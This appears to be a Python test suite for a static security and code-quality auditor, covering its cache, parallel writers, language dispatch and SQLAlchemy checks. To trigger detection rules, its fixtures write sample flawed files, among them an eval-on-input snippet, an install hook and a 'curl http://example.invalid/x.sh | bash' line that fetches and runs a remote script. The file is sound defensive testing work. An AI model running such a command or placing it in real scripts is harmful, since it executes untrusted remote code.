"""Scan engine + per-rule incremental cache + parallel-writer safety (async)."""

import asyncio
from pathlib import Path

from loguru import logger

from auditor.config import AuditorSettings, load_config
from auditor.engine import ScanEngine, audit_target
from auditor.index import IndexStore
from auditor.languages.python.resolve import CalleeResolver
from auditor.paths import index_db_path


def _make_repo(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\ndependencies = ["pydantic"]\n'
        '[tool.auditor]\nextends = "base"\n'
    )
    (tmp_path / ".auditor").mkdir()
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "a.py").write_text("def f(x):\n    eval(x)\n    return x\n")
    (pkg / "b.py").write_text("def g(y):\n    return y\n")
    return tmp_path


async def _scan_dir(root: Path, target: Path, settings, index) -> dict:
    results = await ScanEngine.for_target(
        target, settings=settings, index=index
    ).scan_path(target)
    return {r.file: r for r in results}


async def test_stateless_scan_no_db(tmp_path):
    root = _make_repo(tmp_path)
    res = await ScanEngine.for_target(root / "pkg" / "a.py").scan_file(
        root / "pkg" / "a.py"
    )
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in res.findings}
    assert not (root / ".auditor" / "index.db").exists()  # never written in-repo
    assert not index_db_path().exists()  # a stateless scan writes no cache anywhere
    assert res.cached is False


async def test_incremental_cache_reuses_unchanged(tmp_path):
    root = _make_repo(tmp_path)
    settings = load_config(root)
    db = root / ".auditor" / "index.db"

    async with await IndexStore.connect(db) as index:
        first = await _scan_dir(root, root / "pkg", settings, index)
        assert all(r.cached is False for r in first.values())

    # Re-scan with no edits: everything served from cache.
    async with await IndexStore.connect(db) as index:
        second = await _scan_dir(root, root / "pkg", settings, index)
        assert all(r.cached for r in second.values())

    # Edit one file: only it re-parses; the other stays cached.
    (root / "pkg" / "a.py").write_text("def f(x):\n    return x\n")
    async with await IndexStore.connect(db) as index:
        third = await _scan_dir(root, root / "pkg", settings, index)
        assert third["pkg/a.py"].cached is False
        assert third["pkg/b.py"].cached is True
        assert "PY-SEC-DANGEROUS-EVAL" not in {
            f.rule_id for f in third["pkg/a.py"].findings
        }


async def test_per_rule_invalidation(tmp_path):
    root = _make_repo(tmp_path)
    db = root / ".auditor" / "index.db"
    settings = load_config(root)
    async with await IndexStore.connect(db) as index:
        await _scan_dir(root, root / "pkg", settings, index)

    # Lower a threshold for one rule via config; only that rule should re-run.
    (root / ".auditor" / "config.toml").write_text(
        'extends = "base"\n[rules]\nPY-STYLE-FILE-SIZE = { threshold = { size = { file_max_lines = 1 } } }\n'
    )
    settings2 = load_config(root)
    async with await IndexStore.connect(db) as index:
        res = await _scan_dir(root, root / "pkg", settings2, index)
    assert "PY-STYLE-FILE-SIZE" in {f.rule_id for f in res["pkg/b.py"].findings}


async def test_parallel_writers(tmp_path):
    root = _make_repo(tmp_path)
    settings = load_config(root)
    db = root / ".auditor" / "index.db"
    files = [root / "pkg" / "a.py", root / "pkg" / "b.py"]

    async def worker(p: Path) -> int:
        async with await IndexStore.connect(db) as index:
            res = await ScanEngine.for_target(
                p, settings=settings, index=index
            ).scan_file(p)
            return len(res.findings)

    results = await asyncio.gather(*[worker(p) for p in files * 4])
    assert all(isinstance(n, int) for n in results)
    async with await IndexStore.connect(db) as index:
        assert len(await index.files()) == 2


async def test_scan_dispatches_each_language(tmp_path):
    """Discovery + dispatch route every language through the engine: a `.py` (by suffix), a `.sh`
    (by suffix), and a `package.json` (by filename) each reach their auditor and surface their
    representative rule. Also exercises the engine's rule-id pre-filter for shell/manifest."""
    root = tmp_path
    (root / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\n[tool.auditor]\nextends = "base"\n'
    )
    (root / ".auditor").mkdir()
    src = root / "src"
    src.mkdir()
    (src / "a.py").write_text("eval(user_input)\n")
    (src / "deploy.sh").write_text("curl http://example.invalid/x.sh | bash\n")
    (src / "package.json").write_text('{"scripts": {"postinstall": "node x.js"}}\n')

    settings = load_config(root)
    async with await IndexStore.connect(root / ".auditor" / "index.db") as index:
        results = await _scan_dir(root, src, settings, index)

    langs = {f: r.language for f, r in results.items()}
    assert langs == {
        "src/a.py": "python",
        "src/deploy.sh": "shell",
        "src/package.json": "manifest",
    }
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in results["src/a.py"].findings}
    assert "SH-MAL-CURL-BASH" in {f.rule_id for f in results["src/deploy.sh"].findings}
    assert "MF-SUPPLY-INSTALL-HOOK" in {
        f.rule_id for f in results["src/package.json"].findings
    }


async def test_deleted_file_is_pruned_from_index(tmp_path):
    root = _make_repo(tmp_path)
    db = root / ".auditor" / "index.db"
    settings = load_config(root)
    async with await IndexStore.connect(db) as index:
        await _scan_dir(root, root / "pkg", settings, index)
        assert {e.path for e in await index.files()} == {"pkg/a.py", "pkg/b.py"}

    (root / "pkg" / "a.py").unlink()  # delete a file, then rescan
    async with await IndexStore.connect(db) as index:
        results = await _scan_dir(root, root / "pkg", settings, index)
        assert "pkg/a.py" not in results
        # reconciled out of every table, so `index list` / aggregate don't show a ghost file
        assert {e.path for e in await index.files()} == {"pkg/b.py"}


async def test_deleting_one_of_a_dup_pair_clears_the_crossfile_finding(tmp_path):
    # two files share a model shape -> both flagged; deleting one must clear the survivor's dup
    # finding (no phantom cross-file finding against a file that no longer exists)
    root = tmp_path
    (root / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\ndependencies=["pydantic"]\n'
        '[tool.auditor]\nextends="strict"\n'
    )
    (root / ".auditor").mkdir()
    pkg = root / "pkg"
    pkg.mkdir()
    fields = "    a: int\n    b: str\n    c: float\n"
    (pkg / "a.py").write_text(
        f"from pydantic import BaseModel\nclass Alpha(BaseModel):\n{fields}"
    )
    (pkg / "b.py").write_text(
        f"from pydantic import BaseModel\nclass Beta(BaseModel):\n{fields}"
    )
    settings = load_config(root)
    db = root / ".auditor" / "index.db"

    async with await IndexStore.connect(db) as index:
        first = await _scan_dir(root, pkg, settings, index)
        assert "PY-XFILE-DUP-MODEL" in {f.rule_id for f in first["pkg/b.py"].findings}

    (pkg / "a.py").unlink()
    async with await IndexStore.connect(db) as index:
        second = await _scan_dir(root, pkg, settings, index)
        assert "pkg/a.py" not in second
        assert "PY-XFILE-DUP-MODEL" not in {
            f.rule_id for f in second["pkg/b.py"].findings
        }
        # and no stale finding lingers in the table for aggregate to pick up
        assert all("a.py" not in str(f) for f in await index.all_findings())


def test_audit_target_config_overrides(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    (tmp_path / "a.py").write_text("def f(x):\n    eval(x)\n")
    results = asyncio.run(
        audit_target(
            tmp_path,
            no_index=True,
            config_overrides={"rules": {"PY-SEC-DANGEROUS-EVAL": {"severity": "low"}}},
        )
    )
    sev = next(
        f.severity.value
        for r in results
        for f in r.findings
        if f.rule_id == "PY-SEC-DANGEROUS-EVAL"
    )
    assert sev == "low"  # override lowered the severity


# ---------------------------------------------------------------------------
# New characterisation / coverage tests for audit_target flag branches
# ---------------------------------------------------------------------------


def _make_test_repo(tmp_path: Path) -> Path:
    """Repo with a production file (eval) and a test file (eval) side by side."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\n[tool.auditor]\nextends = "base"\n'
    )
    (tmp_path / ".auditor").mkdir()
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "app.py").write_text("def f(x):\n    eval(x)\n    return x\n")
    tests = tmp_path / "tests"
    tests.mkdir()
    # Use a variable argument so the eval-on-input detector fires (literal arg is safe)
    (tests / "test_app.py").write_text(
        "def test_f(user_input):\n    eval(user_input)\n"
    )
    return tmp_path


def test_audit_target_strict_tests_enables_relaxed_rule(tmp_path):
    """strict_tests=True forces test files into strict mode, so rules normally relaxed on
    test code (like PY-SEC-DANGEROUS-EVAL) fire against them too."""
    root = _make_test_repo(tmp_path)
    results = asyncio.run(audit_target(root, no_index=True, strict_tests=True))
    by_file = {r.file: r for r in results}
    test_file = next((k for k in by_file if "test_app" in k), None)
    assert test_file is not None
    rule_ids_in_test = {f.rule_id for f in by_file[test_file].findings}
    # Under strict_tests the normally-relaxed test role is strict, so eval fires
    assert "PY-SEC-DANGEROUS-EVAL" in rule_ids_in_test


def test_audit_target_no_skips_accepted(tmp_path):
    """no_skips=True is accepted and runs without error (skip directives are ignored)."""
    root = _make_test_repo(tmp_path)
    results = asyncio.run(audit_target(root, no_index=True, no_skips=True))
    assert isinstance(results, list)
    # Production file must still surface eval
    by_file = {r.file: r for r in results}
    prod_file = next((k for k in by_file if "app.py" in k and "test" not in k), None)
    assert prod_file is not None
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in by_file[prod_file].findings}


def test_audit_target_exclude_glob_accepted(tmp_path):
    """exclude=('*.py',) suppresses all Python results — the flag is wired through."""
    root = _make_test_repo(tmp_path)
    results = asyncio.run(audit_target(root, no_index=True, exclude=("*.py",)))
    # Every Python file is excluded — no findings remain
    all_findings = [f for r in results for f in r.findings]
    assert all_findings == []


def test_audit_target_include_gitignored_accepted(tmp_path):
    """include_gitignored=True is accepted and does not crash (smoke test)."""
    root = _make_test_repo(tmp_path)
    # Not a git repo, so gitignore handling is a no-op — just verify no exception
    results = asyncio.run(audit_target(root, no_index=True, include_gitignored=True))
    assert isinstance(results, list)


def test_engine_builds_callee_resolver(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    engine = ScanEngine.for_target(tmp_path)
    assert isinstance(engine.resolver, CalleeResolver)


def test_scan_threads_resolver_without_error(tmp_path):
    # smoke: a real scan runs with the resolver wired through audit() (kwarg accepted end-to-end)
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    (tmp_path / "m.py").write_text("def f():\n    return 1\n")
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    assert isinstance(results, list)


def _greenlet_repo(
    tmp_path: Path, helper_src: str, *, helper_module: str = "app.helpers"
) -> set[str]:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n[tool.auditor.sqlalchemy]\nexpire_on_commit=true\n'
    )
    (tmp_path / "app").mkdir(exist_ok=True)
    (tmp_path / "app" / "helpers.py").write_text(helper_src)
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        f"from {helper_module} import reload\n\n\n"
        "async def f(session, q):\n"
        "    obj = session.scalar_one(q)\n"
        "    await session.commit()\n"
        "    reload(session, obj)\n"
        "    return obj.email\n"
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    return {f.rule_id for r in results for f in r.findings}


def test_resolver_clears_cross_file_refresh(tmp_path):
    rules = _greenlet_repo(
        tmp_path, "def reload(session, obj):\n    session.refresh(obj)\n"
    )
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" not in rules


def test_resolver_conditional_refresh_still_flags(tmp_path):
    rules = _greenlet_repo(
        tmp_path,
        "def reload(session, obj, c=True):\n    if c:\n        session.refresh(obj)\n",
    )
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" in rules


def test_resolver_out_of_repo_helper_still_flags(tmp_path):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n[tool.auditor.sqlalchemy]\nexpire_on_commit=true\n'
    )
    (tmp_path / "app").mkdir(exist_ok=True)
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from third_party.db import reload\n\n\n"
        "async def f(session, q):\n"
        "    obj = session.scalar_one(q)\n"
        "    await session.commit()\n"
        "    reload(session, obj)\n"
        "    return obj.email\n"
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" in {
        f.rule_id for r in results for f in r.findings
    }


def test_engine_passes_resolve_packages_and_env(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    sp = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages"
    sp.mkdir(parents=True)
    engine = ScanEngine(tmp_path, AuditorSettings(resolve_packages=["atmo"]))
    assert engine.resolver._resolve_packages == ("atmo",)
    assert engine.resolver._site_packages == sp


def test_engine_warns_when_reach_set_but_no_env(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    msgs: list[str] = []
    sink_id = logger.add(msgs.append, level="WARNING", format="{message}")
    logger.enable("auditor")
    try:
        ScanEngine(tmp_path, AuditorSettings(resolve_packages=["atmo"]))
    finally:
        logger.disable("auditor")
        logger.remove(sink_id)
    assert any("resolve_packages" in m for m in msgs)


def test_engine_no_warning_when_reach_empty(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    msgs: list[str] = []
    sink_id = logger.add(msgs.append, level="WARNING", format="{message}")
    logger.enable("auditor")
    try:
        ScanEngine(tmp_path, AuditorSettings())
    finally:
        logger.disable("auditor")
        logger.remove(sink_id)
    assert not any("resolve_packages" in m for m in msgs)


def test_dependency_refresh_orms_clears_greenlet(tmp_path):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
        '[tool.auditor]\nresolve_packages = ["atmo"]\n'
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(
        "async def refresh_orms(session, objs):\n    for o in objs:\n        await session.refresh(o)\n"
    )
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from atmo import refresh_orms\n\n\n"
        "async def f(session, q, datafiles):\n"
        "    dataset = session.scalar_one(q)\n"
        "    await session.commit()\n"
        "    await refresh_orms(session, [dataset, *datafiles])\n"
        "    return [ls.name for ls in dataset.labelsets]\n"
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    rules = {f.rule_id for r in results for f in r.findings}
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" not in rules


def test_dependency_refresh_orms_flags_when_not_in_reach(tmp_path):
    # identical, but resolve_packages omits "atmo" -> dep unreadable -> still flagged
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(
        "async def refresh_orms(session, objs):\n    for o in objs:\n        await session.refresh(o)\n"
    )
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from atmo import refresh_orms\n\n\n"
        "async def f(session, q):\n"
        "    dataset = session.scalar_one(q)\n"
        "    await session.commit()\n"
        "    await refresh_orms(session, [dataset])\n"
        "    return dataset.labelsets\n"
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" in {
        f.rule_id for r in results for f in r.findings
    }


# ---------------------------------------------------------------------------
# Edge-case B: greenlet integration
# ---------------------------------------------------------------------------


def _greenlet_dep_repo(
    tmp_path: Path,
    *,
    dep_src: str,
    call_line: str,
    access_expr: str,
    resolve_packages: list[str] | None = None,
) -> list:
    """Build a repo with a dep helper in atmo and an svc that calls it, then scan."""
    if resolve_packages is None:
        resolve_packages = ["atmo"]
    pkgs_str = str(resolve_packages).replace("'", '"')
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
        f"[tool.auditor]\nresolve_packages = {pkgs_str}\n"
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(dep_src)
    (tmp_path / "app").mkdir(exist_ok=True)
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from atmo import reload\n\n\n"
        "async def f(session, q, q2):\n"
        "    obj = session.scalar_one(q)\n"
        "    a = session.scalar_one(q)\n"
        "    b = session.scalar_one(q2)\n"
        f"    await session.commit()\n"
        f"    {call_line}\n"
        f"    return {access_expr}\n"
    )
    return asyncio.run(audit_target(tmp_path, no_index=True))


def test_direct_dep_refresh_helper_clears(tmp_path):
    """B6: dep reload(session, obj) does session.refresh(obj) → NOT flagged."""
    dep_src = "def reload(session, obj):\n    session.refresh(obj)\n"
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
        '[tool.auditor]\nresolve_packages = ["atmo"]\n'
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(dep_src)
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from atmo import reload\n\n\n"
        "async def f(session, q):\n"
        "    obj = session.scalar_one(q)\n"
        "    await session.commit()\n"
        "    reload(session, obj)\n"
        "    return obj.email\n"
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    rules = {f.rule_id for r in results for f in r.findings}
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" not in rules


def test_partial_arg_refresh_flags_only_unrefreshed(tmp_path):
    """B7: dep refreshes only param a; accessing a.x is safe, b.y is still flagged."""
    dep_src = "def save(session, a, b):\n    session.refresh(a)\n"
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
        '[tool.auditor]\nresolve_packages = ["atmo"]\n'
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(dep_src)
    (tmp_path / "app").mkdir()
    svc_lines = (
        "import sqlalchemy\n"
        "from atmo import save\n\n\n"
        "async def f(session, q, q2):\n"
        "    a = session.scalar_one(q)\n"  # line 6
        "    b = session.scalar_one(q2)\n"  # line 7
        "    await session.commit()\n"  # line 8
        "    save(session, a, b)\n"  # line 9
        "    return (a.x, b.y)\n"  # line 10
    )
    (tmp_path / "app" / "svc.py").write_text(svc_lines)
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    findings = [
        f
        for r in results
        for f in r.findings
        if f.rule_id == "SA-GREENLET-ATTR-AFTER-COMMIT"
    ]
    assert findings, "expected SA-GREENLET-ATTR-AFTER-COMMIT to fire for b.y"
    # line 10 has both a.x and b.y — only b.y should be flagged
    flagged_attrs = {f.message for f in findings}
    assert any("b.y" in m for m in flagged_attrs), "b.y must be flagged"
    assert not any("a.x" in m for m in flagged_attrs), (
        "a.x must NOT be flagged (a was refreshed)"
    )


def test_refresh_before_commit_still_flags(tmp_path):
    """B8: reload called BEFORE commit → commit re-expires obj → still flagged."""
    dep_src = "def reload(session, obj):\n    session.refresh(obj)\n"
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
        '[tool.auditor]\nresolve_packages = ["atmo"]\n'
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(dep_src)
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from atmo import reload\n\n\n"
        "async def f(session, q):\n"
        "    obj = session.scalar_one(q)\n"
        "    reload(session, obj)\n"  # refresh BEFORE commit
        "    await session.commit()\n"  # commit re-expires obj
        "    return obj.email\n"  # still flagged
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    rules = {f.rule_id for r in results for f in r.findings}
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" in rules


def test_non_refreshing_dep_helper_still_flags(tmp_path):
    """B9: dep helper doesn't call refresh → finding is NOT cleared."""
    dep_src = "def touch(session, obj):\n    obj.touched = True\n"
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
        '[tool.auditor]\nresolve_packages = ["atmo"]\n'
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(dep_src)
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from atmo import touch\n\n\n"
        "async def f(session, q):\n"
        "    obj = session.scalar_one(q)\n"
        "    await session.commit()\n"
        "    touch(session, obj)\n"
        "    return obj.email\n"
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    rules = {f.rule_id for r in results for f in r.findings}
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" in rules


def test_aliased_dep_import_end_to_end_clears(tmp_path):
    """B10: `from atmo import refresh_orms as ro; await ro(session, [dataset])` → cleared."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\n'
        "[tool.auditor.sqlalchemy]\nexpire_on_commit=true\nasync_session=true\n"
        '[tool.auditor]\nresolve_packages = ["atmo"]\n'
    )
    dep = tmp_path / ".venv" / "lib" / "python3.13" / "site-packages" / "atmo"
    dep.mkdir(parents=True)
    (dep / "__init__.py").write_text(
        "async def refresh_orms(session, objs):\n    for o in objs:\n        await session.refresh(o)\n"
    )
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "svc.py").write_text(
        "import sqlalchemy\n"
        "from atmo import refresh_orms as ro\n\n\n"
        "async def f(session, q, datafiles):\n"
        "    dataset = session.scalar_one(q)\n"
        "    await session.commit()\n"
        "    await ro(session, [dataset, *datafiles])\n"
        "    return [ls.name for ls in dataset.labelsets]\n"
    )
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    rules = {f.rule_id for r in results for f in r.findings}
    assert "SA-GREENLET-ATTR-AFTER-COMMIT" not in rules
